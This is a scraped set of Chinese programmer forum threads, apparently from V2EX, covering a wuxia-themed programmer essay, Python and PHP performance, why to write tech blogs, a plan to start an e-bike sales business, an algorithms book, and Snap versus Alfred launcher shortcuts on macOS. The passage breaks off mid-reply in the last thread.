[
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>文章的题目叫《程序员的江湖：从黑木崖到回龙观》，<a href=\"https://www.qcloud.com/community/article/429524\" rel=\"nofollow\">点此可以查看</a>。</p>\n<p>作者把武侠元素融入到了程序员的日常生活描述，有些句子写的也挺有意思的：梦里寻她千百度，豁然回首却只有 bug 在灯火阑珊处。</p>\n<p>不知道大家有没有共鸣？</p>\n</div></div>"], "reply": "16", "tittle": "发现一篇骨骼清奇的文章，你们是这样的程序员吗？", "comment": ["看得出来文字功底不错\r", "\r", "共鸣 ？ 并没有\r", "\r", "可能已经麻木了", "读故事的话我宁愿读短点的，长的没精力看。\r", "比如这个：\r", "Debugging is like being the detective in a crime movie where you are also the murderer.", "非常诗意的自黑。", " 看来也是经历了文中类似的生活？", " 懂", "看不下去，来看这个 ", " 那个回答写的不错！", " 这个回答我第一次看的时候，简直感动哭😂", "只有改不完的 bug ，摊手", "写的不错，可以去当写手了。不要当程序员了哈哈", " 像医生 美剧豪斯医生那种 自己有病还治病 有时候为了诊断是啥病还需要主动加重（自己的和 /或患者的）病情", "基纽特种部队，这个词我有 20 多年没碰到过了", " 改行说不定收入更高", " 暴露年龄了啊", "服"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>每日推荐</h2>\n<p>如果让你用传统的编程语言写一个程序去识别这些形态各异的数字，你会怎么写？\n写很多方法去检测横、竖、圆这些基本形状，然后计算它们的相对位置？\n我想你很快就会陷入绝望之中。所以，本文我给大家介绍如何用 TensorFlow 进行手写数字识别提升效率。</p>\n<p><a href=\"https://www.qcloud.com/community/article/41257001491363072?fromSource=gwzcw.84419.84419.84419\" rel=\"nofollow\">用 TensorFlow 进行手写数字识别</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "用 TensorFlow 进行手写数字识别", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我现在在一家软件公司上班，做开发。想放弃现在的工作，自己出来干，鉴于对折叠电动自行车、平衡车的前景自认为还是比较乐观的，想跟一个朋友和老表入股创业。想听听各位 V 友的想法与见解，谢谢</p>\n</div></div>"], "reply": "23", "tittle": "程序员转折叠电动自行车、平衡车线上线下销售的前景（杭州），请广大 V 友帮忙提出你们的观念，谢谢", "comment": ["我觉得，锂电滑板车和带座子的锂电滑板车挺好，一折放车里，不占地方，锂电自行车说实话折起来还挺占地方的，脚蹬子啥的", "创业是做自己的品牌还是开店卖？", "楼主现在年薪多少", " 目前不是做自己的牌子，线下开自营店卖，线上通过天猫淘宝平台", " 4-5k 。。。/捂脸 /,刚从大学出来一年不到", "想要一个千元左右的电动滑板车，轻量（ 5kg 左右）、续航够单程上班（ 7 公里）、充电插头可以直接从车里拉出来、轮子够大（ 200mm 以下过路坎可能不安全）、前轮减震、手刹、可装前后灯、可装篮子或袋扣、可折叠拖着走（能折就行快慢无所谓）、能站立（半折叠站立或支架站立）、折叠后能站立（带上公交车地铁方便竖着放）、把手至少一边可以折叠（方便侧躺放车后备箱）、滑板杆不能太短（感觉可调节意义不大，不短就好）", "有个信息是这样的：电动平衡车上路北京的罚款金额是 10 元，上海的罚款金额是 50 元（封顶）。我觉得这前景。。有点悬", "我觉得这个东西很有前景\r", " 目前有挫折是政策性的，可以放长远一点，不过创业者要严肃对待这一点\r", "  我也想转行去做生意了，之前想过安防摄像头等，不过也就是想想。。。💔", "杭州虽然没有查禁，但是公众认知，这个东西是不能上路的，一旦规范那 gg 的可能性大了去了", " 需要的话您可以私信我\r", " 这个问题我之前注意过，北京上海那边都已经管制平衡车不给上路，这个问题值得深究，得跟着政府的政策走。\r", "@有想法就干，年轻人要有魄力，我刚从学校出来没多久，当然至于选择哪一行也得自己去把握和考虑，不能盲目", " 目前杭州还没有这块的明文规定，但确实是一个大问题", "十分讨厌所谓的「平衡车」，有严重的安全隐患，不管是对自己还是对别人。", "我觉得不会比写代码有前景", "我想要个能坐着的滑板车，因为我觉得站着重心高不大稳，可是我不知道买什么牌子， LZ 介绍几个锂电滑板车的牌子吧", " +1\r", "另外一方面是政府在这种电助力的交通工具上管制会越来越多，前景不好", "+1 \r", "政策前景不明朗的产品，风险大过收益。", "风险太大建议慎重考虑", "我在拱墅北软这边，前几天刚好有一批好像是共享平衡车，摆到路边，然而一周后就没有了", "  谢谢你们的意见，我会慎重考虑\r", " 谢谢你们的意见，我会慎重考虑\r", " 谢谢你们的意见，我会慎重考虑", "zf 不支持这个上路, 这个如果没有合适的引导使用容易摔倒摔伤", "讲道理  不如去卖房子", "上次在网上看的 一个链家的中介  工作不到 2 年  交税 5k 。。。", "要是为了赚钱就不要考虑转行，要是为了做生意就不要限制自己做什么——做生意指标就是赚钱，什么赚钱做什么，所以还是做程序员吧，这个做好了指定赚钱", "我有小米自行车 那个非常好。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://cloud.githubusercontent.com/assets/2493622/24841699/d2c79aa4-1d3e-11e7-9aa5-bf0aea263dc2.JPG\"></p>\n<p>先前 PHP 性能不太行， Facebook 搞出了 HipHop PHP (HPHPc), transpile 到 C++代码。最终演化成 Hack &amp; HHVM 。</p>\n<p>现在 Python 性能也不太行（ CPU-bound ），科学计算的工程师们搞出了 Cython ， transpile 到 C/C++代码。不知道最后会演化到什么？当然现在 Cython 还是依赖 Python interpreter memory management and GIL 。</p>\n<p>历史总是相似？对于 CPU-bound 的运算，果然众多动态语言最后都会演变成静态语言， C/C++成为最后归宿？</p>\n<p>个人想法而已，我什么都不确定。。。</p>\n</div></div>"], "reply": "41", "tittle": "历史总是相似？- Python & PHP", "comment": ["cython 历史比 hhvm 久吧…而且也不是为了科学运算", "C++能发挥硬件性能是真的\r", "但实在是太难驾驭了 不是说 c 用不好会砸到自己的脚 C++用不好能废掉整个一条腿", "首先， Cython 不是什么科学分析师搞出来的， python 的最早是用 C 实现的，为了区分 Jython ， IronPython 和 PyPy ，所以叫 Cython 。其次 Python 的最终归宿不会是静态语言，否则很多动态语言的特性都会丢失，要不然也没必要发明 Python 了，你理解的静态只是底层的实现语言而已。", " \r", "你把 Cython 和 CPython 搞混了", " 不好意思是的", "cython 是不是被放弃交给社区维护那个？", "处理不确定性也是刚需", "python 一开始就是用 c 写出来的。其实性能不够，大多机器来凑。", " 而且大数情况下性能劣势根本显现不出来，瓶颈都在网络还有 IO 上。", "python 的运行效率一直都是比较低的\r", "这也说明 py 的使用范围扩展到了 cpu 密集型的领域，或者这些领域的人用静态语言已经用烦了", "据说 Python 转成 pypy 来运行，平均提升的效率也只有 2~4 倍。对于绝大多数场景，扩容 2~4 倍硬件就能解决的事情，都没必要在转码了。\r", "\r", "遇到用超级计算机都还要考虑到性能优化的活，那还是不要用 Python 写吧。", "PHP 这块不是很清楚， Python 最开始的定位就有点胶水语言的意思，其优点就是容易跟 C 集成， Python 很多模块都是用 C 写的。 Cython 只是进一步简化了这个过程。", "python 1991~\r", "php 1995~\r", "\r", "明明 python 资格更老来着，为什么需要借鉴 php 的历史？", "Cython 衍生自 Pyrex,  后者流行时 FB 还没开张呢....", "真正要性能的时候 python 就是个超级 wrapper 罢了。", " 好像是 Cython 历史更早。现在主要是为了科学吧？最早是来拿干什么呢。\r", "\r", "  C/C++难度不是一般，但是用到后面的大牛们都回归 C/C++， Google, Facebook 大面积的 C/C++。\r", "\r", " 好逻辑！\r", "\r", " 虽然 C 写的，但是比如 python a + b 因为 dynamic type 就内含了太多 Python 内部 C 的 operations 了，就慢了。\r", "\r", " 主要还是说 CPU-bound. IO-bound py3.6 coroutines 挺好用的，还有 uvloop 。\r", "\r", " 好逻辑！\r", "\r", " Cython 主要是写 C-extenion ，并不是用来 replace PyPy\r", "\r", " 同意。\r", "\r", " 哈哈，可能是 php 借鉴 python 吧。\r", "\r", " 好像是 Pyrex 资历要老点., 2002.\r", "\r", " 巨 Wrapper.", "Python 做个胶水语言也挺好的。内在的弱点使得它很难上 JIT 。", "io 密集型  用 python", " 动态语言的病根\r", "\r", " 是呀。但是各种科学计算还是 CPU-bound 的。", " 是 CPython 的 JIT 不好做， pypy 早就做了， Jython 也是天生带 JIT", " python 在科学计算的时候，应尽量使用 numpy 之类的库", "我们需要的语言，其实和动态静态无关，我们需要的其实应该是有编译前类型检查，带 GC ，最好还能热更新的现代语言，只是目前满足这几点的都是静态语言而已", " 其实不管是 pypy 还是 HVVM 都算不上成功，目前 jit 这条路就 node 这一个比较成功的例子", " node 是因为没有历史包袱。 pypy 技术上 OK 的，但是一堆为 CPython 写的 C 扩展不兼容，没有办法的。如果一开始就是 pypy ，没有 CPython 这个包袱，扩展都用兼容的方式写，就跟 node 一样了。", " 确实。但这些非官方实现也是小打小闹了，兼容性全无。 Python 的威力就在于 CPython 包罗万有的软件库。这些库都依赖于引用计数为基础的 GC 系统，所以，基本不可能上 JIT 了。", "Nim", "不如先把 GIL 处理处理来的实在", "按我的印象， Python 社区根本不想把 Python 的性能提升起来。我不止一次地被人说， GIL 根本不是问题，因为计算机的性能是过剩的，性能瓶颈是很少的，少数瓶颈用 C 解决就好，多进程比多线程好，多线程是 Windows 没有 COW 的进程而折腾出来的不必要的东西。对，我在 Python 的官网上也能看到这些。\r", "这些都未必没有道理。\r", "只是，你不承认问题，你就没有办法解决问题。", " \r", "\r", "也不是完全不兼容，事实上大部分给 CPython 写的库，在 pypy 下也是可以用的。\r", "\r", "pip 下载量 top 1000 的库，绝大部分是兼容 pypy 的，也有一些公司生产环境中已经在用 pypy 了。\r", "\r", " \r", "\r", "GIL 不是最大的问题，最大的问题是单线程执行的时候性能也不行，被 PHP7 吊打。虽然可以换 pypy ，或者通过引入 numpy 这类 C 扩展，或者用 cython 写扩展解决局部瓶颈。如果能像 PHP7 一样，用户不用做任何事情，直接带来数倍性能提升，当然就更好了。\r", "\r", "其实有时候吐槽 python 性能瓶颈，一天的 PV 可能也就几百万或者一两千万，那都是无病呻吟。", "不是 C/C++快，而是解释开销太大。直接 Python 编译到 ASM 难度太大，先编译到 C 中转一下。", "Python 不是 JIT 不能做，那是做 JIT 很大可能就要破坏现有的接口，动 C API ，那么就一大堆 C 扩展不能用，这个才是最大的问题。\r", "而且 GC 改成 tracing gc 我觉得其实是挺好的，引用计数会有很多问题的，现代的 GC 大多是 tracing GC", "python 就是调用 C 就行了嘛。要说效率不行， tensorflow 用 Python 不一样好好的。", " 为什么一做 JIT 就破坏现有接口？因为接口暴露了太多实现细节。\r", "另外 Python 的 GC 据我所知是既 count 也 trace 的。", "为什么你会认为 Cython 和 HHVM 是同类？ Cython 是为了给 C ABI 的库做 CPython binding 而弄的，既不是 VM 也不是帮你提速的。", "计算机科学发展到现在，为什么要求一门语言所有方面都完美无缺呢？明明有更快的轮子，又不是只为学习，何必破坏语言设计，自己造一个注定不会被所有人接受的新轮子", " 这是因为本身 CPython 代码质量高，二来 C API 暴露的底层细节太多了，很多东西都得在 runtime 时候才能知道，没法优化，知乎上面的 R 大曾经发过多篇文章说这方面。\r", "\r", "然后就是 GC 的问题了，既然 tracing GC 能回收垃圾，那么为什么还要用引用计数？要知道引用计数其实是将每次回收的成本摊分，有人做过比较，除非是内存很紧张，否则朴素 mark-swap 的效率都比引用计数好。毕竟在两个回收周期里面不管 heap 上的对象怎么变化， GC 只管开头结果两个状态。还有就是这个 GC 由引起 GIL 的问题，如果不是引用计数的话， GIL 压根可以不存在，多线程提高多核利用率也可以做。而且社区还是很抵制这些改变，这也是一个问题。 Pycon 2016 US 就有人做演讲在做移除 GIL 的事情， Guido 对他的工作要求是，移除是可以的，但是不要降低单进程下的效率。真是要求很高啊。", "存在不代表是一个趋势， cython 存在很久了，这仅仅只代表存在这部分的需求\r", "大部分 python 并不需要 cython 这种东西", " 我指 Cython 和 HipHop PHP 。 HHVM 是后话。", " 在中国这个巨无霸开始在互联网发力之前，当时的计算机世界也确实不怎么需要计算性能了，欧洲，美洲人就那点人口，根本没有中国这种爆发性的计算需求，这就是为啥现在国内的重量级服务要么 C 要么 java 的原因，国内的人有时候喜欢人云亦云老外的说法，老外在国外呆着，当然不觉得 python 的性能有啥问题。德国地铁不来一趟中国，怎么会知道自己的峰值调度数据连北京日常数据都不如呢", " 中国人口红利。这个理论有点溜"]},
{"content": ["<div class=\"topic_content\">最近我自己搭建了一个 wordpress 博客，连域名都没有，只有一个 IP 地址。\r<br>感觉还不错，主要是记录自己在写代码过程中的心得，好记性不如烂笔头，以后还可以时时回顾一下。\r<br>\r<br>考虑买个域名，像很多其他程序员一样，签名里写这个域名，不管是不是一个牛逼的程序员，得有个范儿。\r<br>\r<br>但考虑来考虑去，不知道这样搞有什么意义。\r<br>\r<br>虽然目前 看着有两个意义：\r<br>1 、自己做总结，毕竟自己会了，再写出来，会加深理解的\r<br>2 、找工作的时候似乎有不少公司，如果有技术博客，是加分项\r<br>\r<br>其他还有什么意义吗？\r<br>\r<br>如果真的发现没啥其他意义了，我也懒得搞个域名了\r<br>找工作的时候，如果有人问技术博客的问题， 把 IP 地址给他就得了。\r<br>主要是不知道除了给自己看，还有给谁看。</div>"], "reply": "82", "tittle": "程序员写技术博客的意义是什么？", "comment": ["根据\"学习金字塔\"理论: 尝试教别人是一种好效果的学习方式. 把理解写成文章时需要不断追问自己, 这时往往会发现 \"会\" 其实是不全会.\r", "\r", "这些文章也是自己的品牌宣传, 不过这就不是短期收益了.", "不用买域名", "小弟说一句，不知道对不对。\r", "博客的内容最重要，而不是形式，\r", "无论是写在自己的个人博客，还是发在公众号、简书等平台，这些都不重要，重要的是内容对自己有意义就行了。\r", "我记笔记主要就是防止记得这个点，但不知道在哪里遇到过，翻看一下博客就知道当时的思路。当然，如果对别人有意义，那也是很好的。", "作为一个有追求的程序员,怎么会用那么大众化的 wordpress !", "更多是为了帮助别人(通过搜索引擎)。\r", "写的时候，最好写清楚点，特别是坑。", " 我对折腾博客程序没兴趣，最近在玩微信机器人", " 因为买了也没人访问是吧？哈哈", "总结的过程中能遇到很多自己其实并没有弄清楚的点,因此也是对我自己的一次查漏补缺.", " 是，内容最重要。", "下次遇到同样问题的时候，去博客把以前写的代码搬出来用，然后又发现出现兼容问题了。。。。。", "帮自己加深理解\r", "存储以备查看\r", "教别人", "耕耘，收获。分享，快乐。", "技术博客，为什么不用 GitHub Pages", " coolshell.cn ， 我很喜欢，这个博客也用 WP ，连 theme 我都是用他用的。难不成用什么程序建个博客都有鄙视链？", "主要是不想干活，又想搞点事情", "主要还是针对自己的，不是针对外在的", "买个.win 之类的域名没多少钱。 博客更多的是笔记和分享。", " ", "\r", "这个词汇已创造", " 我就是不想折腾而已， WP 挺好，几分钟搭建好了，就开始写东西了。没心情折腾太多。也不感兴趣。", " 内容最重要 ，其他的自己开心就好，偏要比个逼格就很没意思了", "其实博客是折腾新东西的产物 出来 mongodb nodejs 这样的新技术 不想买书学 就做博客练手 出来了 ng2 vuejs 就改了个新主题 顺便把坑记下来 分享", "1.技术总结\r", "2.自我营销", " 有道理，自我营销其实挺重要。", "技术总结，算是做笔记，怕万一以后遇到相同问题忘记解决办法时可以看看", "相反，我有域名，没服务器。\r", "\r", "luyi.science", "帮助别人是一方面，还有就是梳理思路吧，当想把曾经的一个技术点写成技术博文的时候就会发现自己对那个知识点其实还是有很多问题的。这样把问题和思路都记录上去，以后回过头来用的时候会节省很多复习时间（往往梳理成博文的知识点一般忘得慢，就算忘了，扫一眼博文就回想起来了）。", "无论自己做备忘还是帮别人给自己增加 reputation 都是好事，楼主要坚持啊", " 恩，写博客的成就感还是不错的，可以坚持下去谢谢支持！", "云笔记就挺好。", "写一遍会注意到可能当时没注意的细节。另外一个，记笔记。", "学习了😐", " 我看很多人的博客都当成笔记去用，其实感觉挺别扭的，我个人觉得博客更多地还是技术文章或者技术观点的输出，当然也可以是一些解决方案的总结(做好 SEO 对博客流量帮助很大)，这样也更有利于自我营销。\r", "笔记交给更专业的软件就好，像印象笔记、为知笔记等等。", "github 上自己搭一个呗", "写作本身是一种爱好", "找工作的时候似乎有不少公司，如果有技术博客，是加分项 \r", "\r", "这得看 blog 的质量。如果质量很烂只是普通的笔记，肯定是减分。", "遇到问题搜索出来的都不是正确答案  结果浪费了大量时间     自己最后解决后 记录下来     希望能帮到遇到同样问题的人 搜索到自己到文章     而不是被搜索引擎的其他垃圾文章浪费大把时间", "额，你没有分享的欲望吗？", "可以考虑放到 github 上，域名也省了，主机也省了   而且高可用性比放你的云主机上好多了", "搞个公众号，到主流的博客中去写，分享自己的经验", "1. 写作习惯\r", "2. 笔记备忘\r", "3. 包装和营销自己的一种手段", " 没太多分享的欲望，只是想抓紧把要干的活干完", "没有整理过思路并形成自己的体系，并不算真正的学会了某种知识。\r", "\r", "恩，我大概说的不是码农的知识；码农的那些框架什么的用不着整理思路。\r", "\r", "算法大概勉强有整理思路的意义吧。", "玩呗 ww", "提供另一种思路，很多时候其实就是一种消遣而已，就像跑来 V2 发帖一样，并没有什么意义，也没想有什么意义。", "写文章当然是给自己看啊，也许多年以后，会觉得透过文章发现现在的自己是多么地单纯。总得在人生中留下点儿什么吧！", "没有域名的话，宣传出去了，万一换主机了怎么办", "说下自己写博客的原因，主要是借着输出倒逼自己输入。给自己定了每天都要写博客的目标，刚开始的时候，真的很难写，每天活都干不完，但是还是给自己打气坚持住了，感觉带来的好处是，写的时候，想的是怎么跟别人说清楚，怎么样对别人有用，思路会清晰很多，也会发现还有不少不懂的地方。至于有没有人能够搜到，我觉得只要你认为你的博客会给别人带来价值，就可以去掘金、开发者头条这种投递投递，自然就会有别人来关注。", "就是想写）然而大部分时间在挖坑，挖完坑之后就不填。", "记录自己的坑和想法。也当作垃圾桶吐槽", "域名还是要有的。至少自己访问的时候，有名字好记哈。。访问也方便", "主要是別忘了. \r", "我一開始學 linux 的時候,根本記不住各種命令\r", "後來就把用到過的命令都記錄在一篇博文里,自己忘了就打開博文搜索一下", " 哦，你是说这些社区还可以投稿？", "意义是我有个博客", "个人认为，如果自己技术栈和 Web 不太相关的话搭个普通的就行了，但如果自己是做 Web 相关的连一个博客小站都做不好还谈整天谈什么调优，高并发？我见过一些做服务器端的开发，自己的博客比如用了 google fonts ，打开奇慢无比，或者主机在境外，也没有上 CDN ，自己也不优化下，在我看来是没有技术追求的体现。\r", "\r", "比如这位朋友的博客： ", " 我问过腾讯云，他们说服务器在国外的话，使用 CDN 加速效果不明显。。。。。", "我写技术博客最大意义是给自己备个忘。。。。\r", "顺便能帮到他人更好，不过在一次迁移过程中手贱删了数据库。。。\r", "目前全靠 github 了。。。", "记录", " 同意内容更重要，弄过 github pages 搞过 2 个文章都没心机弄了。\r", "现在我觉得直接在 issue 里面写就可以了，把更多的精力放在内容上更来得实在。", "正好最近写了一篇 blog 说这个问题 \r", "\r", "\r", "\r", "blog 没必要方便伸手党, 只是为了给自已梳理思路, 构建知识库", " 明不明显自己想下原理嘛，如果是国内用户访问，如果用户从国内访问并正确解析到了国内就近的 CDN 节点，如果此时没有击中 cache 需要回源当然没用，如果击中缓存了那不就对了，如果从境外访问，那就要看境外 DNS 解析及腾讯云的 CDN 海外节点的情况了。", " 腾讯云有中间源的，速度还算可以了，主要还是看缓存策略的设置。", "找女朋友。我知道你们不信，我也是。知道某天一个妹子加了我微信，说是看了我博客，主动找我相亲==", "没有女朋友，你解决了个问题觉得自己很厉害，向谁炫耀？\r", "写博客啊", "为什么上面的回复很少说到 seo 营销？\r", "\r", "博客不断更新，流量只会越来越高，人气只会越来越旺，折腾下来就是自己的一份资产——宣传自己产品和服务的平台。", " 没有鄙视链，总之内容大于界面， coolshell,ruanyf ，我都一直在看", "我来谈谈，我 16 年开始写博客，到现在一年了，中间断过半年\r", "一开始是为了找工作，所以把复习的知识点写成博客\r", "目的：\r", "1 ：为了备忘，知识点忘了看自己的文章总比看别人的回忆得快\r", "2 ：为了找工作加分\r", "\r", "然后后面找工作的时候没什么卵用，别人不会去看你简历上面有什么个人博客的。更不会去翻，唯一一次被面试说看我写了一些博客，然后就问我更多的问题，我就蒙蔽了。。\r", "\r", "后来 17 年继续写博客，有了新的感受\r", "1 ：复习起来真的更方便了\r", "2 ：写系列博客能更深入的掌握知识点，每写一篇都要阅读大量的相关主题资料，无形之中提炼出了知识点\r", "3 ：能帮助到更多人的，自己懂跟写出来让别人也懂，这个是一个档次的区分。\r", "4 ：打响个人品牌，能有更多合作机会\r", "5 ：能赚钱，文章写得好，就有人给你打赏，前天我在简书上面收到一笔 88.88 元的打赏，兴奋了一晚。对了还能赚钱广告钱。\r", "\r", "就这么多，更多关于程序员为什么要写博客，你可以读读刘未鹏《暗时间》中的这篇文章《为什么你应该（从现在开始就）写博客》 ", "\r", "\r", "最后，献上个人独立博客链接，使用 hexo 来搭建的,欢迎来访，关于 Java 后端相关的都有涉及\r", "嘟嘟独立博客： ", "### 装逼 ###", "给自己看，记录自己折腾技术的过程，避免以后踩坑。", " 用博客装逼，那是真穷。人家都用豪车豪宅软妹子装逼。", "我离开自己的博客干不了活", "我不知道大家是怎么想的，我是自己遇到了问题，会去查，去想办法解决，然后立马写个 md 记录，顺手发到博客上，有几次忘记记了，不久后就又碰到了同样的问题，结果只能记个大概，还得重复以前查询的过程。我觉得算是一个记录，对于学习和壁坑很有帮助", " 其实我也是记性不好，只好记下来，下次再用", "个人博客相当于私人知识库，不是所有的知识点都要记在脑子里\r", "网上搜到的或自己研究过的、跑通的方法，都可以记下来，随时查阅", " Great ！我以为就我一个人脑子记性不好要记下来。", " 可以啊，不然社区哪来那么多文章。。", "我个人感觉，主要的意义是写给自己，\r", "不管写什么东西，无论技术还是生活，每个人方向跟生活经历都是不同的。\r", "最后还一点，无论写的好与差，自己开心就好了。", "这让我想起前段时间多说评论系统关闭的事情 好多人很激动很着急  有人就说了 关了就关了呗  挂一个评论有人去评论吗?  哈哈哈哈 想想有时候真是想多了   博客不是 qq 空间 不是朋友圈", " 买个域名一年就几块钱～", "写在简历上,提升一下逼格 也从侧面能反映出你的一些能力水平.", "对域名要求不高的话，可以选择便宜的。有些域名价格非常之低。", "推荐一下我的博客 ", "逼自己努力"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好像只有纸质书卖, 海外党伤不起, 哪里可以买电子版?</p>\n</div></div>"], "reply": "6", "tittle": "想补习一下算法, <算法新解> 这本书如何?", "comment": [" 英文版\r", "\r", "等他出电子版你可以支持一下 ", "多谢楼上, 先看着英文版, 等出电子版一定支持一下.", "去网站 geeksforgeeks\r", "不需要看书", "看看 intro to algorithm", "这哥们先写了英文版，然后再出版了中文版？", "我看过这本 ", "\r", "\r", "感觉还不错。其他的都没仔细看过，不评价。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看用 macbook pro 的人, 大多数认为 alfred 是神器\n但相对于 alfred, 个人感觉 snap 可能更加暴力(也可能是我对 alfred 的使用太皮毛了)</p>\n<p>简单试用后, 总结 alfred 主要功能: 1.打开程序, 2.打开文件 /文件夹, 3.工作流, 4.lock, 5.快速搜索</p>\n<p>如果单看打开程序, alfred 至少需要 4 个键, 一般要 5 个键, 呼出(至少 2 个键) + app 简称(1~2 个, 一般两个更稳定) + 回车(1 个), 如果使用 snap, 两个键足矣</p>\n<p>snap 开启后, dock 上, finder 之后的 9 个 app, 使用 option+数字键 即可打开, 再点击一次则隐藏, 和 windows 下的 win+数字键, 打开开始菜单的前 9 个程序操作逻辑一致\n如果使用的程序超过 9 个, 那么也能手动增加 app, 对增加的 app 设置独立的快捷键, 一般使用 option+某个字母即可(option 很少占用 app 的快捷键), 比如邮件设置成 option+M(mail), 笔记设置成 option+N(note), Dash 设置成 option+D(dash), excel 设置成 option+E(excel)之类的, 最常用的 app15 个左右, 其他的 app, 使用 spotlight 补充</p>\n<p>使用两个键进行程序的快速启动, 确实比 alfred 提高了 100%以上的效率吧, 不算标题党吧</p>\n<p>如果说快速进行 google 搜索, chrome 在 finder 右边第二位 option+2 呼出, 然后在地址栏输入搜索内容即可\n打开文件和文件夹, 使用 spotlight 同样 ok, 而且能搜索文件中的内容(相对来说速度慢一点点)\nlock 的话, 个人使用的是 bettertouchtool 中, 配置的全局快捷键, option + L(lock), 刚好和 windows 下的 win+L 相吻合\n所有的快捷键都是 option 进行触发, 这样逻辑维护更清晰</p>\n<p>工作流的话, 我说实话, 没用过(要花钱, 而且麻烦), 话说, 个人在工作中没有什么常用的场景\n如果大家有什么建议或者疑问, 请不要客气, 谢谢: )</p>\n</div></div>"], "reply": "47", "tittle": "软件推荐: snap, 比 alfred 快 100%", "comment": ["需求不同，这样比较没什么意义。", "脑抽去买了 alfred 的 powerpack ，说实话基本没卵用，可能搜 sof 比较快一点点，别的工作流没发现效率有多少提升，当然可能我没找到好用的工作流。", "完全不同的哲学，这样毫无意义的比较加上标题党真是搞笑", "其实 alfred 的剪贴板最有用", "不是说 snap 渣，但你的标题真扯淡", "你提到的功能全部都不需要额外的应用，都可以用 automator 实现，不过为了避免快捷键冲突（⌥{A-Z} 没有冲突在我这里并不现实），我用了 ⌘⌥⌃⇧{A-Z} 的键位", "就是一个给别的程序设置快捷键的东西，居然写了这么长一篇帖子。。", "需求不同没法比，我 dock 都隐藏的，鬼才知道 finder 后面的 app 都是啥。", "下了 snap 试了试，功能和量级上和 alfred 相差甚远，一起用都可以，不太适合做比较。", "一个 Workflow 完全可以做到同样的功能，而且你 dock 上的应用顺序变了怎么办？", "Alfred 的作用就是不用记快捷键", "  \r", "\r", "切换程序必须每个常用程序对应一个固定按键, 最好有单个物理按键对应切换到上一个使用的窗口这个功能.   \r", "\r", "你说的 option 作为快捷键 冲突太严重, 如果不想日本键盘一样有 kana essiu 键, 就需要牺牲 command option 或者 shift 键.  \r", "  \r", "用 Linux 要求会 shell, 那用 Mac 要求会 osascript 不过分吧, 甚至比 shell 水平差一点都能适应很多需求了.  \r", "\r", "另外, 感觉楼上各位并没有用好工作流.", "我发现现在 V2 很多吐槽 Alfred 的帖子全都对工作流一笔带过，说用不到。。。。。。\r", "\r", "\r", "\r", "请问您知道什么叫 买椟还珠 么？", "Alfred 最强大的功能就是 Workflow 。日常控制 Spotify 、 Emacs org-capture （类似于 OmniFocus 的全局 Capture ）都是用的 Alfred 。\r", "\r", "并且按数字键太麻烦了，还要记住每个 App 对应的数字，我宁愿选择多输入几个键。", "也可能是我对 alfred 的使用太皮毛了\r", "\r", "不是可能,是真的,的确,很,非常- -\r", "\r", "\r", " 我也很想学 osascript,但是没空啊- -workflow 不就是照顾我们这种 osascript 文盲的吗", "alfred 精髓就在 workflow ，觉得没用大概是你还没找到好的插件，或者你的日常里没有大量重复又繁琐的操作，亦或者你的懒癌还没到晚期", "感觉两个完全不是一个东西啊，而且光对比一个功能怎么行？\r", "我在 Alfred 上面可以：\r", "\r", "`todo 明早浇花` \r", "`cal 星期五 5 点见老板谈工资`\r", "\r", "snap 不知道可以么？\r", "\r", "如果光说打开程序这个， Spotlight 也可以啊，而且说实话 Alfred 这个功能和 Spotlight 的没多大区别吧？真不觉得 Alfred 的这个功能是什么可以拿出来比较的。", "你这个 Snap 应该和 Manico 对比（", " 快捷键冲突上面, 暂时用的十几个软件(sequel pro, chrome, sublime, qq, source tree, wiz, 网易云, item2,有道等等等等), 只有 wiz 笔记的几个快捷键是 option+{a-z}冲突, 其他的主要都是通过 cmd+{a-z}或者 cmd+shift+{a-z}完成, 偶尔有 ctrl 加入(item2), 绝大多数不用 option. 其次, 即使用了 option, 不代表那个功能是常用的, 大多数功能是可以牺牲(用的太少太少, 不如把机会留给最常用)的.\r", "\r", "使用 option 的主要目的是  让最常用的功能按最少的键: 2 个. 同时, 将自定义快捷键的逻辑, 定在 option + {a-z}, 逻辑统一", " 嗯, 确实不是一个量级, 只是提一个快速打开 app 的方案啦, 标题有一定玩笑成分啦, 故意没有加上限制条件", " 主要理念是按最少的按键, 2 个. 而且步骤只有 1 步, alfred 的话, 三步: 打开 alfred, 输入关键字(可能还要看关键字是否定位到准确的 app, 不是的话还要上下移动), 输入回车\r", "顺序的话, dock 的顺序, 除非手动拖动, 否则不会改变的, 这个用了 2 年, no problem : )", " 私以为是不是不用鼠标?", " 其实我的 option+{0~9A~Z}就是每个程序, 一套固定按键, 至于快捷键冲突, 发现那些功能都是相对很不常用的(大多数功能, 都是 option 搭配上 cmd 或者 crtl 或者 shift, 而不是单独 option)\r", "不常用(一年用不了 5 次那种), 就舍弃, 让给打开程序最快的\r", "这个完成了最快的切换 app\r", "app 的多个窗口, mac 默认是使用 cmd + `(1 左边的按键)即可\r", "每个窗口的多个页签, 强烈推荐使用  cmd+shift+中括号左右切换, 比 ctrl+tab 稳定好按太多, 而且, 目前唯一不能用的, 就是 mac 自带输入法在英文时的 chrome,,,,,,,,,,,,这个在设置中调整快捷键即可, 也能使用 cmd+数字跳到指定位置的页签\r", "这样, 切换 app(option+{0~9A~Z}), 切换一个 app 的多个窗口(cmd+`), 切换一个窗口的多个页签(cmd+shift+[ ])做到了全 app 的统一\r", "一套按键, 做一件事 : )\r", "\r", "工作流, 暂时貌似没有必须的场景, 求科普", "你用的确实是皮毛，你的需求应该是 一个可以响应 option+1~9 的 dock 。\r", "ps ，标题党，踩", " 刚好你说的这两种事情我也遇到过, 但是我的解决办法是使用语音助手: 提醒我明天早上 8 点浇花. 就能自动生成一条日历事项了, '提醒我 星期五 5 点见老板谈工资', 也能自动生成对应的事项. \r", "优点是: 想起来拿起手机就能做好, 10 秒搞定(拿起手机, 解锁, 打开语音助手, 说完内容到这 7 秒, 错了再说一次, 大约 10 秒), 打字肯定没这么快. 设置好之后直接就在手机上, 提醒很方便\r", "缺点是: 发音不标准可能需要两次, 不过还是很快\r", "综上, 还是没用工作流,,,,,(我也想用这么牛逼的功能啊)", " 第一, 它要收费, 第二, 它是两步, 